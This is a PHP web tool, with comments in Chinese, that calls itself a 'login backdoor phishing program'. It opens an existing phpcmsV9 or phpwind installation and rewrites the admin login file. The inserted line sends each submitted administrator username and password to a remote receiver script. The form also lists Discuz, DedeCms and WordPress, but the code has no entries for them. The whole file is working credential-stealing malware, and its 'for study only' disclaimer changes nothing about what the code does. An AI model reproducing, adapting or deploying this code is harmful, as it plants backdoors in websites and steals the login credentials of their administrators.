
<?php
/**
 +-----------------------------------------------------------------
 * 登录后门钓鱼程序 V1.0	
 +-----------------------------------------------------------------
 * 功能介绍：
 * 本程序会根据所选cms和BBS系统自动插入钓鱼后门
 * 后续将完善支持PHP的主流的cms和bbs系统
 * 本程序仅供学习参考，请勿非法用途 ，请保留版权信息
 +-----------------------------------------------------------------
 * 作者： Return	Blogs: www.creturn.com
 +-----------------------------------------------------------------
 **/


error_reporting(0);
$rHost  = 'http://192.168.1.199/MyProject/server/sever.php';		//定义接收地址
$pUname = 'uname';	//远程端接收用户名参数
$pPwd   = 'pwd';	//定义远程接收密码参数
$error = '';
/**
 * 插入代码
 */
function inSertPwdDoor($cmsCode,$relPath){
	global $rHost,$pUname,$pPwd;
	//读取用户名密码特制
	if($cmsCode['mothed'] == 'post'){
		$rHostPath = $rHost.'?'.$pUname.'=$_POST['.$cmsCode['uname'].']&'.$pPwd.'=$_POST['.$cmsCode['pwd'].']';
	}else{
		$rHostPath = $rHost.'?'.$pUname.'=$_GET['.$cmsCode['uname'].']&'.$pPwd.'=$_GET['.$cmsCode['pwd'].']';
	}
	//获取插入代码
	$keyword = $cmsCode['keyword'];
	$replace = 'file_get_contents("'.$rHostPath.'");'.$cmsCode['bedeck'].$keyword;
	$loginPageContent = file_get_contents($relPath);
	$loginPageContent = str_replace($keyword, $replace, $loginPageContent);
	if(file_put_contents($relPath, $loginPageContent)){
		tipAmessage('成功插入！');
	}else{
		tipAmessage('插入失败！');
	}
}
 
 
function tipAmessage($msg){
	global $error;
	$error = $msg;
}
/**
 * 各类cms登录标识码和文件路径
 * 
 * $code说明：
 * $code['keyword'] 关键字，就是要插入代码的特征码
 * $code['bedeck']  修饰符用来修正代码的外观
 * $code['uname'] 	用户名变量名
 * $code['pwd'] 	密码变量名
 * $code['mothed']  密码提交方式：POST 或者 GET
 * $code['path']	登录文件路径
 * 注意事项：
 * 由于登录口不同程序可能有多个登录方法，正常登录
 * 或者ajax或者第三方登录，所以登录点的关键词必须找准
 */
function switchCms($cmsName){
	$code = array();
	switch ($cmsName) {
		case 'phpcmsV9':
				$code['path']		= 'phpcms/modules/admin/index.php';
				$code['keyword'] 	= "showmessage(L('login_success'),'?m=admin&c=index');";
				$code['bedeck'] 	= "\n\t\t\t";
				$code['uname'] 		= 'username';
				$code['pwd']		= 'password';
				$code['mothed'] 	= 'post';
			break;
		case 'phpwind':
				$code['path']		= 'admin/admincp.php';
				$code['keyword'] 	= "\$REQUEST_URI = trim(\$REQUEST_URI,'?#');";
				$code['bedeck'] 	= "\n\t";
				$code['uname'] 		= 'admin_name';
				$code['pwd']		= 'admin_pwd';
				$code['mothed'] 	= 'post';
			break;
	}
	return $code;
	
}
if(isset($_POST['creack']) && $_POST['creack'] != ''){
	$webRoot = $_SERVER['DOCUMENT_ROOT'];	//当前目录
	$dir = isset($_POST['dir']) && !empty($_POST['dir']) ? trim($_POST['dir']) : '';
	$cms = isset($_POST['cms']) && !empty($_POST['cms']) ? trim($_POST['cms']) : '';
	$cmsCode = switchCms($_POST['cms']);
	if(empty($cmsCode)){
		$error = '没找到可用CMS或者BBS';
	}else{
		$relPath = $webRoot.$dir.$cmsCode['path'];
		if(file_exists($relPath)){
			inSertPwdDoor($cmsCode,$relPath);
		}else{
			tipAmessage('没有找到该文件路径：'.$relPath);
		}
	}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>自动插入语句</title>
<style type="text/css">
*{
font-size:14px;
line-height:20px;
}
div{
	width:450px;
	margin: 0px auto;
}

</style>
</head>

<body>
<div style="width:600px;margin: 0px auto;padding-top: 50px;padding-bottom: 50px; border: 1px #fff012 solid;">
<form action="" method="post">
	<div>
		<h2 style="text-align: center;">登录后门钓鱼程序 V1.0	</h2>
	</div>
	<div>
		<h4 style="color: red">注意：Path参数，默认根目录不用填写，如果目标程序在子目录中请填入路径</h4>
	</div>
	<div>
	当前文件路径：<?php echo __FILE__?><br/>
	</div>
	<div>
	<input type="radio" value="dz" name="cms" id="dzcms" /><label for="dzcms">Discuz</label>
	<input type="radio" value="phpwind" name="cms" id="phpwind" /><label for="phpwind">PhpWind</label>
	<input type="radio" value="phpcmsV9" name="cms" id="v9cms" /><label for="v9cms">PHPCMSv9</label>
	<input type="radio" value="dedecms" name="cms" id="dedecms" /><label for="dedecms">DedeCms</label>
	<input type="radio" value="wordpress" name="cms" id="wrodpress" /><label for="wrodpress">WordPress</label>
	</div>
	
	<div>
	<span>Path:</span></span><input type="text" name="dir" />
	<input type="submit" name="creack" value="插入后门" />
	</div>
	<div style="text-align: left; color: red; margin-top:20px;">消息：<?php echo $error;?></div>
</form>
</div>
</body>
</html>
